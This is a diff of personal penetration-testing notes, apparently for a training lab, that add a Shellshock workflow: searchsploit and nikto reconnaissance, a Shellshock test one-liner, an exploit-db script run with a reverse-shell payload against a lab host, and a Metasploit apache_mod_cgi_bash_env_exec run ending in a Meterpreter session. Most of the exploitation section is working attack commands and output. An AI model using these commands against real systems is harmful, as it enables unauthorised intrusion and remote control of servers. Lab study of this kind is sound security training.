@@ -75,22 +75,77 @@ Other things to check:
 Re-evaluate attack surface:
 * Any new findings to add to our list of attack vectors?
 
-### EXPLOITATION - LOW PRIVILEGE USER
+### FINDING AN EXPLOIT TO USE
 
-Searchsploit
-```bash 
-$ searchsploit [options] [search_term1] [search_term2] . . . [search_termN]
+Nikto webapp scanner:
+```bash
+$ nikto -host 10.11.1.71
 ```
 
-Searchsploit (EXAMPLE - Apache 2.4.7):  
-(no results fit)
+Searchsploit (exploit-db):
 ```bash
+# BASE EXAMPLE
+$ searchsploit [options] [search_term1] [search_term2] . . . [search_termN]
+
+# APACHE 2.4.8 EXAMPLE
 $ searchsploit apache 2.4 | grep -v '/dos/'
 $ searchsploit apache 2.x | grep -v '/dos/'
+
+# APACHE | CGI
+$ searchsploit apache cgi | grep -v '/dos/'
+
+# WORKING EXPLOIT CODE FOUND IN:
+/usr/share/exploitdb/platforms/linux/remote/34900.py
 ```
 
-Searchsploit (EXAMPLE - Apache CGI):  
-(suitable result: Apache mod_cgi - Remote Exploit (Shellshock))
+Nmap:
 ```bash
-$ searchsploit apache cgi | grep -v '/dos/'
+$ ls -l /usr/share/nmap/scripts/*shellshock*
+```
+
+Other areas to find exploit code:
+* Google Shellshock POC
+* Google one-liners from github
+
+If no good attack vectors / exploit can be found, try a different or more comprehensive wordlist for subdirectory brute-forcing or use a webapp scanner to poke harder at the system.
+
+### USING EXPLOIT CODE
+
+METHOD #1: MANUAL
+```bash
+env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id	# Src: Github one-liner
+```
+
+METHOD #2: EXPLOIT-DB
+```bash
+$ cp /usr/share/exploitdb/platforms/linux/remote/34900.py alpha.py
+$ python alpha.py payload=reverse rhost=10.11.1.71 lhost=10.11.0.31 lport=4444 pages=/cgi-bin/admin.cgi
+10.11.1.71>
+```
+
+METHOD #3: METASPLOIT (NOT PREFERRED)
+```bash
+$ systemctl start postgresql
+$ msfdb init
+$ msfdb start
+$ msfconsole
+msf > search shellshock
+msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf exploit(apache_mod_cgi_bash_env_exec) > show options
+. . .
+. . .
+msf exploit(...) > set RHOST 10.11.1.71
+msf exploit(...) > set TARGETURI /cgi-bin/admin.cgi
+msf exploit(...) > set LHOST 10.11.0.4
+msf exploit(...) > set LPORT 443
+msf exploit(...) > show options
+. . .
+. . .
+msf exploit(...) > run
+[*] Started reverse TCP handler on 10.11.0.42:443
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Transmitting intermediate stager...(106 bytes)
+[*] Sending stage (826872 bytes) to 10.11.1.71
+[*] Meterpreter session 1 opened (10.11.0.42:443 -> 10.11.1.71:34930) at 2018-12-18 13:53:55 +1100
+meterpreter >
 ```
